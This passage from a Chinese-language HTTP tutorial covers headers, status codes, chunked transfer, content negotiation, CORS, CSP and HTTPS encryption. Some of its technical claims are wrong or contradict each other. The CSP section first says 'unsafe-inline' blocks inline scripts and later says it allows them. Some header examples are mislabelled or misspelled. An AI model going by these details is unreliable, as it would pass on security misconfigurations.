|          | Access-Control-Max-Age           | （预检请求）列出正式请求中 `Access-Control-Allow-Headers` 和 `Access-Control-Allow-Methods` 缓存时间 | `Access-Control-Max-Age: 600`                                |

#### 2.4.5 缓存协商

| 报文形式 | 首部字段名          | 说明                                            | 示例                                                 |
| -------- | ------------------- | ----------------------------------------------- | ---------------------------------------------------- |
| 通用     | Cache-Control       | 表示资源的缓存策略                              | `Cache-Control: no-cache`                            |
| 请求头   | If-Modified-Since   | 比较资源的更新时间                              | `If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT`   |
|          | If-Match            | 比较实体标记（ETag）                            | `If-Match: “737060cd8c284d8af7aD3082f209582d”`       |
|          | If-None-Match       | 比较实体标记（与 If-Match 相反）                | `If-None-Match: “737060cd8c284d8af7ad3082f209582d”`  |
|          | If-Range            | 资源未更新时发送实体 Byte 的范围请求            | `If-Range: “737060cd8c284d8af7ad3082f209582d”`       |
|          | If-Unmodified-Since | 比较资源的更新时间（与 If-Modified-Since 相反） | `If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT` |
| 响应头   | Expires             | 表示资源的过期时间                              | `Expires: Thu, 01 Dec 2010 16:00:00 GMT`             |
|          | Last-Modified       | 表示服务器认定资源最后的修改时间                | `Last-Modified: Tue, 15 Nov 2010 12:45:26 GMT`       |
|          | ETag                | 请求变量的实体标签的当前值                      | `ETag: “737060cd8c284d8af7ad3082f209582d”`           |

#### 2.4.6 权限认证

| 报文形式 | 首部字段名          | 说明                                                   | 示例                                                         |
| -------- | ------------------- | ------------------------------------------------------ | ------------------------------------------------------------ |
| 通用     | Via                 | 代理服务器的相关信息                                   | `Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)`                |
| 请求头   | Authorization       | 用于验证用户代理身份的凭证                             | `Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==`          |
|          | Proxy-Authorization | 代理服务器对客户端的认证信息                           | `Proxy-Authenticate: Basic realm="Access to the internal site"` |
| 响应头   | WWW-Authenticate    | 服务器对客户端的认证信息                               | `WWW-Authenticate: Basic`                                    |
|          | Proxy-Authenticate  | 用于指定代理服务器上的资源访问权限而采用的身份验证方式 | `Proxy-Authenticate: Basic realm="Access to the internal site"` |

#### 2.4.7 其他

| 首部字段名        | 说明                                                        | 示例                                           |
| ----------------- | ----------------------------------------------------------- | ---------------------------------------------- |
| Allow             | 资源可支持的 HTTP 方法                                      | `Allow: GET,HEAD`                              |
| Trailer           | 报文末端的首部一览                                          | `Trailer: Max-Forwards`                        |
| Transfer-Encoding | 指定报文主题的传输编码方式                                  | `Transfer-Encoding:chunked`                    |
| Location          | 用来重定向接收方到非请求 URL 的位置来完成请求或标识新的资源 | `Location: http://www.leixuesong.cn/724`       |
| Retry-After       | 如果实体暂时不可取，通知客户端在指定时间之后再次尝试        | `Retry-After: 120`                             |
| Server            | Web 服务器的安装信息                                        | `Server: Apache/1.3.27 (Unix) (Red-Hat/Linux)` |

### 2.5 HTTP 状态码

- **1xx**：表示目前是协议处理的中间状态，还需要后续操作
- **2xx**：表示成功状态
- **3xx**：重定向状态，资源位置发生变动，需要重新请求
- **4xx**：请求报文有误
- **5xx**：服务端发生错误

#### 2.5.1 1xx Informational 信息化

表示临时响应并需要请求者继续执行操作的状态代码。

| 状态码 | 含义                | 说明                                                         |
| ------ | ------------------- | ------------------------------------------------------------ |
| 100    | Continue            | （**继续**）请求者应当继续提出请求。 服务器返回此代码表示已收到请求的第一部分，正在等待其余部分。 |
| 101    | Switching Protocols | （**交换协议**）请求者已要求服务器切换协议，服务器已确认并准备切换。 |
| 102    | Processing          | （**处理中**）该代码表示服务器已经收到并正在处理请求，但无响应可用。[[6\]](https://zh.wikipedia.org/wiki/HTTP状态码#cite_note-RFC_2518-6)这样可以防止客户端超时，并假设请求丢失。 |

#### 2.5.2 2xx Success 成功

表示成功处理了请求的状态代码。

| 状态码  | 含义                          | 说明                                                         |
| ------- | ----------------------------- | ------------------------------------------------------------ |
| **200** | OK                            | （**成功**）服务器已成功处理了请求。 通常，这表示服务器提供了请求的网页。 |
| 201     | Created                       | （**已创建**）请求成功并且服务器创建了新的资源。             |
| 202     | Accepted                      | （**已接受**）服务器已接受请求，但尚未处理。                 |
| 203     | Non-Authoritative Information | （**非授权信息**）服务器已成功处理了请求，但返回的信息可能来自另一来源。 |
| 204     | No Content                    | （**无内容**）服务器成功处理了请求，但没有返回任何内容。     |
| 205     | Reset Content                 | （**重置内容**）服务器成功处理了请求，但没有返回任何内容。   |
| 206     | Partial Content               | （**部分内容**）服务器成功处理了部分 GET 请求。使用场景为 HTTP 分块下载和断点续传，当然也会带上相应的响应头 `Content-Range`。 |
| 207     | Multi-Status                  | （**多状态**）代表之后的消息体将是一个 XML 消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。 |
| 208     | Already Reported              | （**已报告**）DAV 绑定的成员已经在（多状态）响应之前的部分被列举，且未被再次包含。 |
| 226     | IM Used                       | （**使用的**）服务器已经满足了对资源的请求，对实体请求的一个或多个实体操作的结果表示。 |

#### 2.5.3 3xx Redirection 重定向

表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。

| 状态码  | 含义               | 说明                                                         |
| ------- | ------------------ | ------------------------------------------------------------ |
| 300     | Multiple Choices   | （**多种选择**）针对请求，服务器可执行多种操作。服务器可根据请求者选择一项操作，或提供操作列表供请求者选择 |
| **301** | Moved Permanently  | （**永久重定向**）请求的网页已永久移动到新位置。服务器返回此响应时，会自动将请求者转到新位置（响应头 Location 为新 URL） |
| **302** | Found              | （**临时重定向**）请求的网页已转移到新 URL，Location 首部返回新的 URL，但请求者后续仍然使用原有位置来进行请求 |
| 303     | See Other          | （**查看其他位置**）请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码 |
| **304** | Not Modified       | （**未修改**）自从上次请求后，请求的网页未修改过。 服务器返回此响应时，不会返回网页内容 |
| 305     | Use Proxy          | （**使用代理**）请求者只能使用代理访问请求的网页。 如果服务器返回此响应，还表示请求者应使用代理 |
| 307     | Temporary Redirect | （**临时重定向**）与 302 类似，唯一区别是不允许将请求方法从 POST 改为 GET |
| 308     | Permanent Redirect | （**永久重定向**） 请求和所有将来的请求应该使用另一个 URI 重复 |

#### 2.5.4 4xx Client Error 客户端错误

这些状态代码表示请求可能出错，妨碍了服务器的处理。

| 状态码  | 含义                            | 说明                                                         |
| ------- | ------------------------------- | ------------------------------------------------------------ |
| **400** | Bad Request                     | （**错误请求**）服务器不理解请求的语法。                     |
| 401     | Unauthorized                    | （**未授权**）请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。 |
| 402     | Payment Required                | （**需要付费**）                                             |
| **403** | Forbidden                       | （**禁止**）服务器拒绝请求。比如法律禁止、信息敏感等等。     |
| **404** | Not Found                       | （**未找到**）服务器找不到请求的网页。                       |
| 405     | Method Not Allowed              | （**不允许的方法**）禁用请求中指定的方法。                   |
| 406     | Not Acceptable                  | （**不可接受**）无法使用请求的内容特性响应请求的网页。       |
| 407     | Proxy Authentication Required   | （**需要代理授权**）此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。 |
| 408     | Request Timeout                 | （**请求超时**）服务器等候请求时发生超时。                   |
| 409     | Conflict                        | （**冲突**）服务器在完成请求时发生冲突。 服务器必须在响应中包含有关冲突的信息。 |
| 410     | Gone                            | （**已删除**）如果请求的资源已永久删除，服务器就会返回此响应。 |
| 411     | Length Required                 | （**需要有效长度**）服务器不接受不含有效内容长度标头字段的请求。 |
| 412     | Precondition Failed             | （**未满足前提条件**）服务器未满足请求者在请求中设置的其中一个前提条件。 |
| 413     | Payload Too Large               | （**请求实体过大**）服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。 |
| 414     | URI Too Long                    | （**请求的 URI 过长**）请求的 URI（通常为网址）过长，服务器无法处理。 |
| 415     | Unsupported Media Type          | （**不支持的媒体类型**）请求的格式不受请求页面的支持。       |
| 416     | Range Not Satisfiable           | （**请求范围不符合要求**）如果页面无法提供请求的范围，则服务器会返回此状态代码。 |
| 417     | Expectation Failed              | （**未满足期望值**）服务器未满足"期望"请求标头字段的要求。   |
| 422     | Unprocessable Entity            | **（不可处理的实体）**请求格式正确，但是由于含有语义错误，无法响应。 |
| 423     | Locked                          | **（已锁定）**当前资源被锁定。                               |
| 424     | Failed Dependency               | **（失败的依赖）**由于之前的某个请求发生的错误，导致当前请求失败。 |
| 431     | Request Header Fields Too Large | **（请求头过大）**请求头的字段内容太大。                     |

#### 2.5.5 5xx Server Error 服务端错误

这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。

| 状态码  | 说明                            |                                                              |
| ------- | ------------------------------- | ------------------------------------------------------------ |
| **500** | Internal Server Error           | （**服务器内部错误）**） 通用错误消息，服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。 |
| 501     | Not Implemented                 | （**未执行**）服务器不具备完成请求的功能。 例如，服务器无法识别请求方法时可能会返回此代码。 |
| **502** | Bad Gateway                     | （**错误网关**）服务器作为网关或代理，从上游服务器收到无效响应。 |
| 503     | Service Unavailable             | （**服务不可用**）服务器目前无法使用（由于超载或停机维护）。通常，这只是暂时状态。 |
| 504     | Gateway Timeout                 | （**网关超时**）服务器作为网关或代理，但是没有及时从上游服务器收到请求。 |
| 505     | HTTP Version Not Supported      | （**HTTP 版本不受支持**）服务器不支持请求中所用的 HTTP 协议版本。 |
| 506     | Variant Also Negotiates         | （**变体也进行协商**）                                       |
| 507     | Insufficient Storage            | （**存储空间不足**）服务器无法存储完成请求所必须的内容。     |
| 508     | Loop Detected                   | （**检测到循环**）服务器在处理请求时陷入死循环。             |
| 509     | Bandwidth Limit Exceeded        | （**带宽限制超出**）                                         |
| 510     | Not Extended                    | （**未满足**）获取资源所需要的策略并没有被满足。             |
| 511     | Network Authentication Required | （**网络认证需要**）客户端需要进行身份验证才能获得网络访问权限，旨在限制用户群访问特定网络。 |

### 2.6 HTTP 连接

HTTP 连接是 HTTP 报文传输的关键通道。

#### 2.6.1 持久连接

HTTP 协议采用 请求-应答 模式：

- 普通模式：每个请求/应答客户和服务器都要新建一个连接，完成之后立即断开连接
- Keep-Alive 模式：该功能使客户端到服务器端的连接持续有效，当出现对服务器的后继请求时，Keep-Alive 功能避免了建立或者重新建立连接

在 HTTP/1.0 版本中，如果客户端浏览器支持 Keep-Alive ，那么就在 HTTP 请求头中添加一个字段 `Connection: Keep-Alive`，当服务器收到附带有 `Connection: Keep-Alive` 的请求时，它也会在响应头中添加一个同样的字段来使用 `Keep-Alive` 。这样一来，客户端和服务器之间的 HTTP 连接就会被保持，不会断开（超过 `Keep-Alive` 规定的时间，意外断电等情况除外），当客户端发送另外一个请求时，就使用这条已经建立的连接。

在 HTTP/1.1 版本中，默认情况下所有连接都被保持，如果加入 `Connection: close` 才关闭。目前大部分浏览器都使用 HTTP 1.1 协议，也就是说默认都会发起 Keep-Alive 的连接请求了，所以是否能完成一个完整的 Keep-Alive 连接就看服务器设置情况。

**注意**

- HTTP Keep-Alive 简单来说就是保持当前的 TCP 连接，避免了重新建立连接
- HTTP 长连接不可能一直保持，例如 `Keep-Alive: timeout=5, max=100`，表示这个 TCP 通道可以保持 5 秒，且该长连接最多接收 100 次请求就断开
- HTTP 是无状态协议，意味着每个请求都是独立的，Keep-Alive 没能改变这个结果

**使用长连接后，客户端和服务端如何知道本次传输结束呢？**

1. 判断传输数据是否达到了 `Content-Length` 指示的大小
2. 动态生成的文件采用分块传输的方式传输（`Transfer-Encoding: chunked`），这时候就要根据 `chunked` 编码来判断，`chunked` 编码的数据在最后有一个空 `chunked` 块，表明本次传输数据结束

#### 2.6.2 传输编码

传输编码在 HTTP 的报文中，使用 `Transfer-Encoding` 首部字段进行标记，它就是指明当前使用的传输编码。

`Transfer-Encoding` 会改变报文的格式和传输的方式，使用它不但不会减少内容传输的大小，甚至还有可能会使传输变大，看似是一个不环保的做法，但是其实是为了解决某些特殊问题。

简单来说，传输编码必须配合持久连接使用，为了持久连接中，将数据分块传输，并标记传输结束而设计的。

#### 2.6.3 分块编码传输

`Transfer-Encoding` 在 HTTP/1.1 协议里，就只有 `chunked` 这个参数，标识当前为分块编码传输。

分块传输的规则：

1. 每个分块包含一个十六进制的数据长度值和真实数据
2. 数据长度值独占一行，和真实数据通过 CRLF（\r\n）分割
3. 数据长度值，不计算真实数据末尾的 CRLF，只计算当前传输块的数据长度
4. 最后通过一个数据长度值为 0 的分块，来标记当前内容实体传输结束

##### 2.6.3.1 不定长包体实现

分块传输编码 Chunked Transfer Encoding

```http
Transfer-Encoding: chunked
```

表示分块传输数据，设置这个字段后会自动产生两个效果：

- `Content-Length` 首部字段会被忽略
- 基于长连接持续推送动态内容

我们以 Node.js 模拟分块传输：

```js
const http = require('http')

const serve = http.createServer((req,res)=>{
    if(req.url === '/'){
        res.setHeader('Content-type','text/html;charset=utf8');
        res.setHeader('Content-Length',10);
        res.setHeader('Transfer-Encoding', 'chunked');
        res.write('Hello world!');
        setTimeout(()=>{
            res.write('first')
        },1000)
        setTimeout(()=>{
            res.write('second')
        },2000)
    }
})

serve.listen(8080,()=>{
    console.log('http://localhost:8080');
})
```

##### 2.6.3.2 分块编码的拖挂

当我们使用 `chunked` 进行分块编码传输的时候，传输结束之后，还有机会在分块报文的末尾，再追加一段数据，此数据称为拖挂（Trailer）。

拖挂的数据，可以是服务端在末尾需要传递的数据，客户端其实是可以忽略并丢弃拖挂的内容的，这就需要双方协商好传输的内容了。

在拖挂中可以包含附带的首部字段，除了 `Transfer-Encoding`、`Trailer` 以及 `Content-Length` 首部之外，其他 HTTP 首部都可以作为拖挂发送。

##### 2.6.3.3 内容编码和传输编码结合

内容编码和传输编码一般都是配合使用。我们会先使用内容编码，将内容实体进行压缩，然后通过传输编码分块发送出去。客户端接收到分块的数据，再将数据进行重新整合，还原成最初的数据。

#### 2.6.4 管线化连接

默认情况下 HTTP 协议中每个传输层连接只能承载一个 HTTP 请求和响应，浏览器会在收到上个请求的响应后，再发送下个请求。

在使用持久连接的情况下，某个连接上消息传递类似于 `请求1 -> 响应1 -> 请求2 -> 响应2 -> 请求3 -> 响应3`.

HTTP Pipelining（管线化）是将多个 HTTP 请求整批提交的技术，在传送过程中不需等待服务端的应答。使用 HTTP 管线化后，某个连接上的消息变成类似这样，`请求1 -> 请求2 -> 请求3 -> 响应1 -> 响应2 -> 响应3`。

注意事项：

- 管线化机制通过 **持久连接**（Persistent Connection）完成，仅 HTTP/1.1 支持此技术
- 只有 GET 和 HEAD 请求可以进行管线化，而 POST 则有所限制
- 初次创建连接时不应启动管线机制，因为服务器不一定支持 HTTP/1.1 版本的协议
- 管线化不会影响响应到来的顺序
- HTTP/1.1 要求服务器端支持管线化，但并不要求服务器端也对响应进行管线化处理，只要要求对于管线化的请求不失败即可
- 由于上面提到的服务器端问题，开启管线化很可能并不会带来大幅度的性能提升，而且很多服务器端和代理程序对管线化的支持并不好，因此现代浏览器如 Chrome 和 Firefox 默认并未开启管线化支持

### 2.7 HTTP 内容协商

在 HTTP 协议中，**内容协商机制** 指通过为相同 URI 指向的资源提供不同的展现形式，可以使用户代理选择与用户需求相适应的最佳匹配（例如：文档使用的自然语言、图片的格式或者内容编码形式）。

#### 2.7.1 基本原则

![](./img/2-7-1-基本原则.png)

最佳展示形式的选取可以通过两种机制实现：

- 客户端设置特定的 HTTP 首部字段（标准方式）
- 服务端返回 300（Multiple Choices）状态码或者 406（Not Acceptable）状态码（备选方案）

##### 2.7.1.1 服务端驱动型内容协商机制

![](./img/2-7-1-1- 服务端驱动型内容协商机制.png)

在服务端驱动型协商机制或者主动协商机制中，浏览器（或者其他任何类型的用户代理）会随同 URL 发送一系列的消息头。这些消息头描述了用户倾向的选择。服务器则以此为线索，通过内部算法来选择最佳方案提供给客户端。

##### 2.7.1.2 代理驱动型内容协商机制

![](./img/2-7-1-2-代理驱动型内容协商机制.png)

在协商机制中，每一个特性需要对应一个首部。如果想要使用屏幕大小、分辨率或者其他方面的特性，就需要创建一个新的首部。而且在每一次请求中都必须发送这些首部。在首部很少的时候，这并不是问题，但是随着数量的增多，消息体的体积会导致性能的下降。带有精确信息的首部发送的越多，信息熵就会越大，也就准许了更多 HTTP 指纹识别行为，以及与此相关的隐私问题的发生。

从 HTTP 协议制定之初，该协议就准许另外一种协商机制：代理驱动型内容协商机制，或称为响应式协商机制。

在这种协商机制中，当面临不明确的请求时，服务器会返回一个页面，其中包含了可供选择的资源的链接。资源呈现给用户，由用户做出选择。

不幸的是，HTTP 标准没有明确指定提供可选资源链接的页面的格式，这一点阻碍了将这一过程无痛自动化。除了退回至服务端驱动型内容协商机制外，这种自动化方法几乎无一例外都是通过脚本技术来完成的，尤其是 JavaScript 重定向技术：在检测了协商的条件之后，脚本会触发重定向动作。另外一个问题是，为了获得实际的资源，需要额外发送一次请求，减慢了将资源呈现给用户的速度。

#### 2.7.2 常见协商要素

##### 2.7.2.1 质量因子

质量因子 `q`：内容的质量、可接受类型的优先级

1. 内容质量。举例，客户端发起一个图片的请求，这个图片只供快速浏览用的，那么就可以做非常高的压缩比，这时的质量 `q` 就可以比较低。如果这个图片用作医学的，那么 `q` 就比较大，因为不能容忍医用照片模糊以损失大量的细节。
2. 可接受类型的优先级。举例：有一个 URI 即支持中文，又支持英文。但是希望优先显示中文，就能用 `q` 来表示。

##### 2.7.2.2 媒体类型

媒体资源的 MIME 类型及质量因子

```http
Accept: text/html, application/xhtml+xml,application/xml;q=0.9,_/_;q=0.8
Axxept: text/html, application/xhtml+xml,application/xml;1=0.9,image/webp,image/apng,_/_;q=0.8,application/signed-exchange;v=b3
```

##### 2.7.2.3 编码类型

内容编码：主要指压缩算法

```http
Accept-Encoding: gzip. deflate, br
```

##### 2.7.2.4 表述语言

```http
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
```

#### 2.7.3 资源表述头部字段

##### 2.7.3.1 媒体类型编码

```http
Content-Type: text/html; charset=utf-8
```

##### 2.7.3.2 内容编码

```http
Content-Encoding: gzip
```

##### 2.7.3.3 表述语言

```http
Content-Language: de-DE, en-CA
```

### 2.8 HTTP CORS 跨域资源共享

跨域资源共享（CORS：Cross-Origin Resource Sharing）是一种机制，它使用额外的  HTTP 头来告诉浏览器，让运行在相同域（Origin）上的 Web 应用被准许访问来自不同源服务器上的指定的资源（也即是 [同源策略](https://tsejx.github.io/javascript-guidebook/computer-networks/frontend-security/same-origin-policy) 的 HTTP 解决方案）。当一个资源从与该资源本身所在的服务器**不同的域、协议或端口**请求一个资源时，资源会发起一个**跨域 HTTP 请求**。

CORS 机制是为了在认可用户发起的请求的同时，阻止恶意注入脚本；并在以下情况发起的 HTTP 请求时触发：

- 不同的协议：比如从 `https://example.com` 调用 `http://example.com`
- 不同的域：比如从 `example.com` 调用 `api.com`
- 不同的子域：比如从 `example.com` 调用 `api.example.com`
- 不同的端口：比如从 `example.com` 调用 `example.com:3001`

#### 2.8.1 实现条件

浏览器将 CORS 请求分成两类：

- 简单请求（simple request）
- 非简单请求（not-so-simple request）

##### 2.8.1.1 简单请求

只要满足以下条件，就属于简单请求：

1. 请求方法是以下三种方法之一

   - **HEAD**
   - **GET**
   - **POST**

2. 自定义设置集合外的头部字段

   - **Accept** 告知服务端当前客户端可处理的内容类型

   - **Accept-Language** 允许客户端声明它可以理解的自然语言，以及优先选择的区域方言

   - **Content-Language** 说明访问者希望采用的的语言

   - Content-Type

     （例如

      

     ```
     application/json
     ```

      

     为非简单请求）指示资源的 MIME 类型

     - `text/plain`
     - `multipart/form-data`
     - `application/x-www-form-urlencoded`

   - **DPR**

   - **Downlink**

   - **Save-Data**

   - **Viewport-Width**

   - **Width**

   - **Last-Event-ID**

3. 请求中的任意 XMLHttpRequestUpload 对象均没有注册任何事件监听器；XMLHttpRequestUpload 对象可以使用 `XMLHttpRequest.upload` 属性访问。

4. 请求中没有 ReadableStream 对象。

##### 2.8.1.2 非简单请求

除了简单请求这些限制外的都为非简单请求。

非简单请求需要满足使用以下任意方法的条件：

- PUT
- DELETE
- CONNECT
- OPTIONS
- TRACE
- PATCH

最常用于判断是否为简单和非简单请求的方法主要是通过 **请求方法** 和 `Content-Type` 头部字段的值。

#### 2.8.2 预请求 Preflight

预请求是 OPTIONS 请求，浏览器会自动添加 `Access-Control-Allow-Headers` 和 `Access-Control-Allow-Methods` 头部字段。

需要服务端返回的响应头 `Access-Control-Allow-Headers`、`Access-Control-Allow-Methods` 和 `Access-Control-Allow-Origin`。

除了 `Access-Control-Allow-Origin` 是必须的之外，其他两种只有在不符合简单请求需要的时候服务器才需要添加，比如在简单请求的基础上自定义了一个请求头 `X-xx-name: chris`，那么服务器只需要在响应头中添加 `Access-Control-Allow-Headers`。

每种响应头都可以使用 `*` 通配符来表示所有。

##### 2.8.2.1 减少预请求次数

可以通过设置 `Access-Control-Max-Age` 来减少预请求的次数，需要包含在预请求的响应头中，指定在该时间内预请求验证有效，不必每次都进行预请求，它的单位是 `s`。如 `Access-Control-Max-Age: 1728000`，即有效期为 20 天。

##### 2.8.2.2 正常请求

预请求完之后就可以发送正常请求了，正常请求的步骤与简单请求一致，也需要添加 `Access-Control-Allow-Origin` 响应头。

##### 2.8.2.3 应用场景

跨域资源共享标准（Cross-Origin Sharing Standard）允许在下列场景中使用跨域 HTTP 请求：

- 前文提到的由 XMLHttpRequest 或 Fetch 发起的跨域 HTTP 请求
- Web 字体（CSS 通过 `@font-face` 使用跨域字体资源）
- WebGL 贴图
- 使用 `drawImage` 将 `Images/viedo` 画面绘制到 Canvas
- 样式表（使用 CSSOM ）

### 2.9 HTTP CSP 内容安全策略

内容安全策略 (CSP) 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 (XSS) 和数据注入攻击等。无论是数据盗取、网站内容污染还是散发恶意软件，这些攻击都是主要的手段。

CSP 是一种由开发者定义的安全性政策性申明，通过 CSP 所约束的规则指定可信的内容来源（这里的内容可以指脚本、图片、`iframe`、`font`、`style` 等等可能的远程的资源）。通过 CSP 协定，让 Web 处于一个安全的运行环境中。

为使 CSP 可用，需要配置网络服务器返回 `Content-Security-Policy` HTTP 头部。

除此之外，`<meta>` 元素也可以用于配置该策略：

```html
<meta http-equiv="Content-Security-Policy" />
```

#### 2.9.1 指令选项

##### 2.9.1.1 资源加载指令

通过获取指令来控制某些可能被加载的确切的资源类型的位置：

CSP 策略在默认的情况下是不允许使用 `data URIs` 资源的，如果要使用，那么需要显示的指定：

- `script-src`：在处理脚本资源的时候设置 `unsafe-inline` 可以阻止内联 Js 代码的执行，使用 `unsafe-eval` 开关可以禁止 `eval`、`setTimeout`、`setInterval` 函数的执行
- `style-src`：会控制样式表@import 和 rel 时所引入的 URI 资源，设置 unsafe-inline 规则可以是浏览器拒绝解析内部样式和内联样式定义。并不会阻止链入外部样式表。
- `img-src`：可以控制图片资源的连接，包括 `img` 标签的 `src` 属性，以及 CSS3 中的 `url()` 和 `image()` 方法，以及 `link` 标签中的 `href` 属性（当 `rel` 设置成与图像相关的值，比如 HTML 支持的 icon）
- `font-src`：控制 CSS 中的 `@font-face` 加载的字体源地址
- `frame-src`：设置允许通过类似 `<frame>` 和 `<iframe>` 标签加载的内嵌内容的源地址
- `manifest-src`：限制应用声明文件的源地址
- `media-src`：控制媒体类型的外部链入资源，如 `<audio>`、`<video>`、`<source>` 和 `<track>` 标签的 `src` 属性
- `object-src`：控制 `<embed>`、`<code>`、`<archive>`、`<applet>` 等对象
- `prefetch-src`：指定预加载或预渲染的允许源地址
- `connect-src`：控制 XMLHttpRequest 中的 `open()`、WebSocket、EventSource

另外 `inline script` 和 `eval` 类型函数（包括 `eval`、`setInterval`、`setTimeout` 和 `new Function()`）也是不被执行的。

##### 2.9.1.2 default-src

`default-src` 用于设置上面各个选项的默认值。

```http
Content-Security-Policy: default-src 'self'
```

上面代码限制所有外部资源，只能从当前渔民该加载。

如果同时设置某个单项限制（比如 `font-src`）和 `default-src`，前者会覆盖后者，即字体文件会采用 `font-src` 的值，其他资源依然采用 `default-src` 的值。

##### 2.9.1.3 其他限制

其他一些安全相关的功能，也放在了 CSP 里面：

- `block-all-mixed-content`：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）
- `upgrade-insecure-requests`：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议
- `plugin-types`：限制可以使用的插件格式
- `sandbox`：浏览器行为的限制，比如不能有弹出窗口等。

##### 2.9.1.4 report-uri

有时，我们不仅希望防止 XSS，还希望记录此类行为。`report-uri` 就用来告诉浏览器，应该把注入行为报告给哪个网址。

```http
Content-Security-Policy: default-src 'self'; ...; report-uri /my_amazing_csp_report_parser;
```

上面代码指定，将注入行为报告给 `/my_amazing_csp_report_parser` 这个 URL。

浏览器会使用 `POST` 方法，发送一个 `JSON` 对象，下面是一个例子。

```json
{
  "csp-report": {
    "document-uri": "http://example.org/page.html",
    "referrer": "http://evil.example.com/",
    "blocked-uri": "http://evil.example.com/evil.js",
    "violated-directive": "script-src 'self' https://apis.google.com",
    "original-policy": "script-src 'self' https://apis.google.com; report-uri http://example.org/my_amazing_csp_report_parser"
  }
}
```

#### 2.9.2 选项值

每个限制选项可以设置以下几种值，这些值就构成了白名单。

- **主机名**：`example.org`、`https://example.com:443`
- **路径名**：`example.org/resources/js/`
- **通配符**：`*.example.org`、`*://*.example.com:*`（表示任意协议、任意子域名、任意端口）
- **协议名**：`https:`、`data:`
- **关键字 `'self'`**：当前域名，需要加引号
- **关键字 `'none'`**：禁止加载任何外部资源，需要加引号

多个值也可以并列，用空格分隔。

```http
Content-Security-Policy: script-src 'self' https://apis.google.com
```

如果同一个限制选项使用多次，只有第一次会生效。

```http
# 错误的写法Content-Security-Policy: script-src https://host1.com; script-src https://host2.com
# 正确的写法Content-Security-Policy: script-src https://host1.com https://host2.com
```

#### 2.9.3 script-src 的特殊值

除了常规值，`script-src` 还可以设置一些特殊值。注意，下面这些值都必须放在单引号里面。

- `unsafe-inline`：允许执行页面内嵌的 `<script>` 标签和事件监听函数
- `unsafe-eval`：允许将字符串当作代码执行，比如使用 `eval`、`setTimeout`、`setInterval` 和 `Function` 等函数。
- `nonce` 值：每次 HTTP 回应给出一个授权 token，页面内嵌脚本必须有这个 token，才会执行
- `hash` 值：列出允许执行的脚本代码的 Hash 值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。

`nonce` 值的例子如下，服务器发送网页的时候，告诉浏览器一个随机生成的 `token`。

```http
Content-Security-Policy: script-src 'nonce-EDNnf03nceIOfn39fn3e9h3sdfa'
```

页面内嵌脚本，必须有这个 token 才能执行。

```html
<script nonce="EDNnf03nceIOfn39fn3e9h3sdfa">
  // some code
</script>
```

`hash` 值的例子如下，服务器给出一个允许执行的代码的 `hash` 值。

```http
Content-Security-Policy: script-src 'sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng='
```

下面的代码就会允许执行，因为 hash 值相符。

```html
<script type="text/javascript">
  alert('Hello, world.');
</script>
```

注意，计算 `hash` 值的时候，`<script>` 标签不算在内。

除了 `script-src` 选项，`nonce` 值和 `hash` 值还可以用在 `style-src` 选项，控制页面内嵌的样式表。

### 2.10 HTTPS

**超文本传输安全协议**（Hyper Text Transfer Protocol over Secure Socket Layer，HTTPS），是一种通过计算机网络进行安全通信的传输协议。HTTPS 经由 HTTP 进行通信，但利用 **SSL / TLS** 来加密数据包。HTTPS 开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。

```http
HTTPS = HTTP + SSL（加密 + 认证 + 完整性保护）
```

HTTP 协议采用明文传输信息，存在信息窃听、信息篡改和信息劫持的风险，而协议 SSL / TLS 具有**身份验证**、**信息加密**和**完整性校验**的功能，可以避免此类问题发生。

SSL / TLS 全称安全传输层协议 Transport Layer Security，是介于 TCP 和 HTTP 之间的一层安全协议，不影响原有的 TCP 协议和 HTTP 协议，所以使用 HTTPS 基本上不需要对 HTTP 页面进行太多的改造。

#### 2.10.1 安全问题

使用 HTTP 协议通信存在的问题：

- **窃听**：通信内容不经加密有可能**被第三方捕获**
- **伪造**：第三方拦截通信内容，并**伪装成发送方**向接收方发送通信内容
- **否认**：发送方将**恶意数据**发送给接受方并否认这些数据是它发送的

窃听属于数据加密问题，而伪造和否认则属于身份认证问题。

<img src="./img/2-10-1-窃听.png" style="zoom: 50%;" />

![](./img/2-10-1-伪造.png)

![](./img/2-10-1-否认.png)

#### 2.10.2 解决方案

对通信内容进行加密的解决方案：

- **对称加密**：使用相同密钥加密/解密，但是钥匙交付问题无法解决
- **非对称加密**：公钥加密数据，私钥解密数据，但是加密/解密消耗时间较多
- **混合加密**：公钥加密密钥，密钥加密数据，私钥解密密钥，密钥解密数据（非对称传送密钥，密钥传送数据）。解决非对称加密效率问题
- **中间人攻击**：秘密替换公钥窃取数据，源于服务端无法确认客户端公钥是否合法
- **消息鉴别码**：`MAC` 密钥和密文组成的字符串的哈希值。能够解决 `伪造` 问题，但无法解决 `否认` 问题
- **数字签名**：服务端创建数字签名，而客户端只验证签名是否争取。解决 `否认` 问题
- **数字证书**：由权威机构背书创建证书，保证公钥不被篡改。解决 `中间人攻击` 问题

##### 2.10.2.1 对称加密

**对称加密算**法（Symmetric Key Algorithms）加密使用的密钥和解密使用的密钥是相同的。也就是说，加密和解密都是使用的同一个密钥。因此对称加密算法要保证安全性的话，密钥要做好保密，只能让使用的人知道，不能对外公开。

![](./img/2-10-2-1-对称加密.jpg)

**对称密钥加密**一个很重要的特点就是使用相同的密钥进行加密和解密

